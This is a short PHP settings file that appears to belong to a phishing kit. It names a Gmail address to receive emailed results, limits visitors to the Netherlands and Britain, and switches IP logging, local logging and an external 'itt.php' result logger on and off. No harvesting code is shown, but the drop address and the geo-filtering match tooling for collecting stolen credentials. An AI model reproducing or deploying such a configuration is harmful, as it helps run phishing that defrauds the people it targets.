<?php

$send="ralphshaw6263@gmail.com";


$pageonline=1; //   feature On (1) and off (0) toggle

$country_block=0; //Enabling this will only allow allowed_countries visitors
$allowed_countries=array("NL","GB"); // Enter here the countries standard 2-character codes to allow them.
$ip_logger=0; //   feature On (1) and off (0) toggle
$email_feature=1;  // feature On (1) and off (0) toggle
$log_feature=1;  // feature On (1) and off (0) toggle
$external_log=0; // feature On (1) and off (0) toggle

$external_link="http://www.domain.com/extern/itt.php";  // Link for external server's itt.php file







function randomCha($len)
{
	$str="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	$out="";
	for($i=0;$i<=$len;$i++)
	{
		$out.=$str[rand(0,51)];
	}
	return $out;
}


?>